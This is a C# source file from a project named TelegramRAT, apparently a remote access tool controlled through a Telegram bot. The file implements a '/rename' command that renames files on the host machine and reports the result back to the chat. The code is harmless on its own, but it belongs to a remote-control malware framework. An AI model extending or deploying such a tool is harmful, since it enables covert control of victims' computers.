using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class RenameCommand(ITelegramBotClient botClient, IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "rename";
    public override string[] Aliases => new[] { "ren" };
    public override int ArgsCount => 2;
    public override string Description => "Rename file. First argument must be path (full or relative) for file. Second argument must contain only new name.";
    public override string Example => "/rename \"C:\\Users\\User\\Documents\\Old Name.txt\" \"New Name.txt\"";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            string oldPath = model.Args[0];
            string newName = model.Args[1];
            string directory = Path.GetDirectoryName(fileSystemService.GetFullPath(oldPath)) ?? string.Empty;
            string newPath = Path.Combine(directory, newName);

            if (fileSystemService.FileExists(oldPath) && !fileSystemService.FileExists(newPath))
            {
                await Task.Run(() => fileSystemService.MoveFile(oldPath, newPath));
                await botClient.SendMessage(model.Message.Chat.Id, "Done!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
            else
            {
                if (!fileSystemService.FileExists(oldPath))
                    await botClient.SendMessage(model.Message.Chat.Id, "This file does not exist!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
                if (fileSystemService.FileExists(newPath))
                    await botClient.SendMessage(model.Message.Chat.Id, "There is a file with the same name!", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            }
        }
        catch (Exception ex)
        {
            await notificationService.ReportExceptionAsync(model.Message, ex);
        }
    }
}
